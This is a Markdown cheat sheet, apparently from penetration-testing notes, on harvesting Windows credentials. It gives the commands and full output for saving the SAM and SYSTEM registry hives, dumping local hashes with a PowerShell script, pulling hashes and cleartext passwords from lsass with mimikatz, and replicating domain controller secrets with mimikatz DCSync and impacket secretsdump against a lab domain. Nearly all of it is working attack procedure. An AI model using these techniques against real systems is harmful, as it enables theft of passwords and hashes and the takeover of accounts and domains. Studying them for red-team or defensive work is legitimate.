# Credential Collection

## Local

### GET SAM and Security when system running

On remote computer extrach SAM and SYSTEM

```text
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```

[Credit](https://superuser.com/a/1088644)

### Read Local Sam Hashes Powershell

Download script from here : [https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1)

import and run script

```text
PS C:\Users\testuser\Desktop\share> . .\Get-PassHashes.ps1
PS C:\Users\testuser\Desktop\share> Get-PassHashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
win10:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### mimikatz lsass.DMP local analyze

if we cant run mimikatz on target machine, we can get dump of lsass process and analyze local computer.

Create dump of process \(need administrator rights\)

![image](https://user-images.githubusercontent.com/13157446/130370304-7543ddde-fe67-4094-95d8-df3ecf252352.png)

Dump file is located

```text
C:\Users\win10\AppData\Local\Temp\lsass.DMP
```

Get passwords

```text
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords full
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 2436075 (00000000:00252beb)
Session           : Interactive from 1
User Name         : win10
Domain            : LOKI
Logon Server      : LOKI
Logon Time        : 8/21/2021 2:28:13 AM
SID               : S-1-5-21-4116903850-2340306423-3138033007-1000
        msv :
         [00010000] CredentialKeys
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
         [00000003] Primary
         * Username : win10
         * Domain   : LOKI
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
         * Username : win10
         * Domain   : LOKI
         * Password : (null)
        kerberos :
         * Username : win10
         * Domain   : LOKI
         * Password : (null)
        ssp :
        credman :
```

### mimikatz logonpasswords

cmd needs to run administrators rights / locally

```text
PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .# ^ #.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v #'       Vincent LE TOUX             ( vincent.letoux@gm
  '####'        > https://pingcastle.com / https://mysmartlogon

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 5990364 (00000000:005b67dc)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : VALHALLA
Logon Server      : ODIN
Logon Time        : 13.08.2021 11:47:21
SID               : S-1-5-21-3410397846-649609989-2919355437-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : VALHALLA
         * LM       : 4fb7d301186e0eb3695109ab020e401c
         * NTLM     : c718f548c75062ada93250db208d3178
         * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
        tspkg :
         * Username : Administrator
         * Domain   : VALHALLA
         * Password : Pass123!
        wdigest :
         * Username : Administrator
         * Domain   : VALHALLA
         * Password : Pass123!
        kerberos :
         * Username : Administrator
         * Domain   : VALHALLA.LOCAL
         * Password : Pass123!
        ssp :
        credman :
```

## Remote

### mimikatz dcsync

authuser should be admin rights

```text
mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
[DC] 'valhalla.local' will be the domain
[DC] 'odin.valhalla.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[rpc] Username : administrator
[rpc] Domain   :
[rpc] Password : Pass123!

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 13.08.2021 07:22:10
Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
    ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
    lm  - 0: 36fa5c99898f8a75a7783f250a6bf892
```

### impacket - Secretsdump

```text
┌──(kali㉿kali)-[~]
└─$ /usr/bin/impacket-secretsdump -just-dc-ntlm valhalla.local/administrator:Pass123\!@valhalla.local -just-dc-user testuser
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
valhalla.local\testuser:2117:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
[*] Cleaning up... 
```

